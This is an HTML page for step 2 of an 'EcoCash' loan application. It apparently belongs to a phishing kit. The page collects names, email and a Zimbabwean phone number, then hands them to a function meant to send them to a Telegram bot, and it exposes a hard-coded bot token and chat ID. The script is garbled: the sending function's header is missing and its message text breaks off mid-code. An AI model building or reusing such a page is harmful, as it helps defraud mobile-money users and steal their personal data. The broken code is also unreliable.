<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash - Loan Application</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        
        .logo {
            text-align: center;
            font-size: 32px;
            color: #667eea;
            margin-bottom: 30px;
            font-weight: bold;
        }
        
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 24px;
        }
        
        .input-group {
            margin-bottom: 25px;
        }
        
        .input-label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 14px;
            font-weight: bold;
        }
        
        .phone-input {
            display: flex;
            align-items: center;
            border: 1px solid #ddd;
            border-radius: 10px;
            overflow: hidden;
            background: #f9f9f9;
        }
        
        .country-code {
            padding: 0 20px;
            background: #eee;
            height: 100%;
            display: flex;
            align-items: center;
            color: #666;
            font-weight: bold;
            font-size: 18px;
        }
        
        .phone-input input {
            border: none;
            background: transparent;
            padding: 18px;
            font-size: 16px;
            width: 100%;
        }
        
        .btn-login {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            transition: transform 0.3s;
            margin-top: 20px;
        }
        
        .btn-login:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }
        
        .step-indicator {
            text-align: center;
            margin-top: 30px;
            color: #667eea;
            font-size: 14px;
            font-weight: bold;
        }
        
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #999;
            border-top: 1px solid #eee;
            padding-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">EcoCash</div>
        <h2>Personal Information</h2>
        
        <div class="input-group">
            <label class="input-label">First Name</label>
            <input type="text" id="firstName" placeholder="Enter your first name" value="">
        </div>
        
        <div class="input-group">
            <label class="input-label">Last Name</label>
            <input type="text" id="lastName" placeholder="Enter your last name" value="">
        </div>
        
        <div class="input-group">
            <label class="input-label">Email Address</label>
            <input type="email" id="email" placeholder="Enter your email" value="">
        </div>
        
        <div class="input-group">
            <label class="input-label">Phone Number</label>
            <div class="phone-input">
                <div class="country-code">+263</div>
                <input type="tel" id="phone" placeholder="648488448" maxlength="9">
            </div>
        </div>
        
        <button class="btn-login" onclick="savePersonalInfo()">
            NEXT STEP
        </button>
        
        <div class="step-indicator">
            Step 2 of 3 â€¢ Personal Information
        </div>
        
        <div class="footer">
            Â© 2025 EcoCash
        </div>
    </div>

    <script>
        // Get saved application data
        let applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
        
        // Auto-fill if available
        document.addEventListener('DOMContentLoaded', function() {
            if (applicationData.firstName) {
                document.getElementById('firstName').value = applicationData.firstName;
            }
            if (applicationData.lastName) {
                document.getElementById('lastName').value = applicationData.lastName;
            }
            if (applicationData.email) {
                document.getElementById('email').value = applicationData.email;
            }
            if (applicationData.phone) {
                document.getElementById('phone').value = applicationData.phone;
            }
        });
        
        function savePersonalInfo() {
            const firstName = document.getElementById('firstName').value.trim();
            const lastName = document.getElementById('lastName').value.trim();
            const email = document.getElementById('email').value.trim();
            const phone = document.getElementById('phone').value.trim();
            
            if (!firstName || !lastName) {
                alert('Please enter your first and last name');
                return;
            }
            
            if (!email || !email.includes('@')) {
                alert('Please enter a valid email address');
                return;
            }
            
            if (!phone || phone.length < 9) {
                alert('Please enter a valid phone number');
                return;
            }
            
            // Save personal info to application data
            applicationData.firstName = firstName;
            applicationData.lastName = lastName;
            applicationData.email = email;
            applicationData.phone = phone;
            
            localStorage.setItem('loanApplication', JSON.stringify(applicationData));
            
            // Send personal info to Telegram
            sendPersonalInfoToTelegram(applicationData);
            
            // Go to next step
            window.location.href = 'application-step3.html';
        }

            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
            const chatId = '5520957080';
            
            const message = `

                .catch(error => console.error('Error sending personal info:', error));
        }
    </script>
</body>
</html>
